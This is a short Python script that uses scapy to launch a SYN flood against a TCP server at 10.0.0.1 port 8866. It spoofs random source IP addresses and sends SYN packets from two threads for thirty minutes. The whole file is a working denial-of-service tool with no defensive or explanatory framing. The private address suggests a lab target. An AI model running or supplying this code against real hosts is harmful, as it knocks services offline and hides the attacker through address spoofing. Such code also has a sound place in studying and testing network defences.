from random import randint
from threading import Thread
import time
from scapy.all import *

"""
    TCP server 
    ip = 10.0.0.1
    port = 8866
"""
def random_src_ip():
    ip_part1 = randint(1, 255)
    ip_part2 = randint(1, 255)
    ip_part3 = randint(1, 255)
    ip_part4 = randint(1, 255)
    return str(ip_part1) + "." + str(ip_part2) + "." + str(ip_part3) + "." + str(ip_part4)

def send_syn_packet(dip, dport):
    src_ip = random_src_ip()
    src_port = randint(2000, 65535)
    ipLayer = IP(src=src_ip, dst=dip)
    tcpLayer = TCP(sport=src_port, dport=dport, flags="S")
    packet = ipLayer / tcpLayer
    send(packet,verbose=False)

def synflood(dip, dport, running_time):
    start_time = time.clock()
    end_time = time.clock()
    ping_packet = 0
    while end_time - start_time < running_time:
        send_syn_packet(dip, dport)
        ping_packet += 1
        print("send %d packets." % ping_packet)
        end_time = time.clock()


if __name__ == '__main__':
    host_num = 15
    TCP_ip = "10.0.0.1"
    TCP_port = 8866
    t_synflood1 = Thread(target=synflood, args=(TCP_ip, TCP_port, 1800,))
    t_synflood2 = Thread(target=synflood, args=(TCP_ip, TCP_port, 1800,))
    print("starting syn flood attack.")
    t_synflood1.start()
    t_synflood2.start()

    if not (t_synflood1.is_alive() and t_synflood2.is_alive()):
        print("syn flood attact is over.")